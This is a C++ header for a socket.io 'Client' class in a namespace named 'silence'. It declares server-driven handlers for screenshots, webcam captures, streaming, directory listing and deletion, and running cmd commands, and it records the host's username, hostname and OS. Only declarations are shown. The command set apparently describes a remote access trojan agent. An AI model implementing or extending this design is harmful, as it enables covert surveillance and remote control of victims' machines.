#pragma once

#include <fstream>
#include <functional>
#include <future>
#include <iterator>
#include <utility>

#include <sio_client.h>
#include <sio_message.h>
#include <sio_socket.h>

#include <core/Util.h>

namespace silence {
    class Client {
    public:
        using CommandObject = std::map<std::string, sio::message::ptr>;

        explicit Client(std::string url);

        ~Client();

        void connect();

    private:
        void onConnected(const std::string &nsp);

        void onFailed();

        void onClosed(sio::client::close_reason const &reason);

    private:
        sio::message::list createObject(const CommandObject &object);

        template<typename T, typename... Args>
        void launchEvent(const std::function<T> &callable, Args &&... args);

    private:
        void onCommand(std::string const &name, sio::message::ptr const &data,
                       bool hasAck, sio::message::list &ack_resp);

    private:
        void greetEvent(); // starts the client
        void screenshotEvent(); // takes a screenshot
        void webcamShotEvent(); // takes a webcam shot
        void killStreamEvent(); // kills a stream
        void startStreamEvent(); // creates a stream

        // TODO: Add file upload and download
        void listDirEvent(const CommandObject &object); // lists a directory
        void mkDirEvent(const CommandObject &object); // creates a directory
        void removeEvent(const CommandObject &object); // removes a directory
        void cdEvent(const CommandObject &object); // changes the current directory
        void getCwdEvent(const CommandObject &object); // returns the current working directory
        void installDirEvent(const CommandObject &object); // returns the install directory
        void cmdEvent(const CommandObject &object); // executes a cmd command

        void response(const std::string &event, const sio::message::list &msg);

    private:
        std::string mUrl;
        std::unique_ptr<sio::client> mIO;
        std::mutex mLock;
        std::mutex mStreamLocker;

        std::condition_variable_any mCond;
        bool mStreamRunning{false};

        sio::socket::ptr mSocket;

    private:
        std::string mInstallDirectory;
        std::string mUsername;
        std::string mHostname;

#if defined(__linux__)
        std::string mOS{"Linux"};
#elif defined(_WIN32)
        std::string mOS { "Windows" };
#else
        std::string mOS { "MacOS" };
#endif
    };
} // namespace silence